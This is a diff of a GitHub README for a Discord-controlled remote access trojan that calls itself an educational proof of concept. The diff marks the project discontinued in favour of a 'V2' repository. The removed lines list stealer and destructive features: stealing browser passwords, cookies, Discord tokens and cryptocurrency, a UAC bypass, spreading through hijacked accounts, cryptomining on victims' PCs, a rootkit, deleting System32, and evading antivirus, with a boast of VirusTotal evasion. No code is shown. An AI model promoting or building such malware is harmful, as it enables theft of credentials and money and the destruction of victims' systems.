@@ -1,7 +1,6 @@
 # Hello ❤
 
-## On Every 5 Stars an big Update will be dropped.
-# ~~5~~, ~~10~~, ~~15~~, ~~20~~, ~~25~~, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80
+# Discontinued, please use RAT V2: https://github.com/H-zz-H69/Discord-RAT-v2
 
 # Educational RAT – Proof-of-Concept
 
@@ -13,33 +12,8 @@ It is intended to be used **only in a controlled, isolated test environment** (e
 
 By using this software, you agree that you will only run it in safe, legal environments and will not misuse it in any way. The creator is not responsible for any damage caused by the misuse of this project.
 
-# In the near Future; (Features in next update have an "X" on the end)
-
-- RAT Builder with GUI 🎁  
-- Plugin options to add custom features 🍕🍕  
-- `!browser` – Steals passwords, history, cookies, and more 🦕🦖  
-- On first-time startup, it automatically steals data ⚡  
-- Discord injection to capture password changes and token 🗝                                                 
-- Get Discord account info using the `!token` command 🔑
-- Discord !token command doesnt work smh lol 💀
-- Add UAC bypass to get admin access without a prompt 🔒  
-- Spreads via Discord token (spamming in random servers and DMs) 📲  
-- Known bug: RAT may crash when sending fake error message boxes 🛠️                                            
-- Cryptocurrency stealer 💰  
-- Launch a child process for each command (helps avoid antivirus detection by respawning if killed) 🔄  
-- Cryptocurrency mining on victim’s PC 💻  
-- Launch a rootkit 🕵️‍♂️  
-- Delete System32 💣  
-- Reinstall Windows 🔄💻  
-- Uninstall Windows and launch a Linux distro 🐧
-- Start an steam game ❌   ❌   ❌    ❌    ❌    ❌    ❌    ❌                                                                      
-- Create and change to new Desktop.   ❌    ❌    ❌    ❌    ❌ 
-- Move Folders around by command   ❌    ❌    ❌    ❌    ❌    ❌ 
-- taskkill random programs with custom interval   ❌    ❌    ❌    ❌ 
-- Toggle command which closes every program entered   ❌    ❌    ❌    ❌ 
-- Change Res and layout of Victims Monitor   ❌    ❌    ❌    ❌    ❌ 
-- Ratelimit check on many ratted PCS by not sending every message 20 times   ❌    ❌    ❌    ❌ 
-- Undetected on Virustotal (https://www.virustotal.com/gui/file/343bd77b607f12754a2a58fea41f08e3e1c7326207f5fb4798cc217325fca4a4?nocache=1)
+# Virustotal 
+- https://www.virustotal.com/gui/file/343bd77b607f12754a2a58fea41f08e3e1c7326207f5fb4798cc217325fca4a4?nocache=1)
   
 ## [Setup](https://www.youtube.com/watch?v=3AtgXzT03hU):
 Install [Python 3.9.11](https://www.python.org/downloads/release/python-3911/)
@@ -51,23 +25,6 @@ Install [Python 3.9.11](https://www.python.org/downloads/release/python-3911/)
 ## About This RAT
 
 This RAT was created by H-zz-H.
-
-If you have any questions or need assistance, you can reach me on Discord, join my server: [Discord Server](https://discord.gg/29Ya4F3CgQ).
-
-Join my Discord for:
-
-- Coding help 🤖
-- Troubleshooting errors related to this RAT 🛠️
-- New ideas, projects, or feature suggestions 💡
-
-If you'd like to add new features or improve this RAT, go ahead! Feel free to share your work with me on Discord. 🙌
-
-I will update and maintain this project as long as I have time. If I stop, well... I don’t know. ⏳
-
----
-
-# Virustotal:
-- ## https://www.virustotal.com/gui/file/343bd77b607f12754a2a58fea41f08e3e1c7326207f5fb4798cc217325fca4a4?nocache=1
 
 ## Disclaimer
 
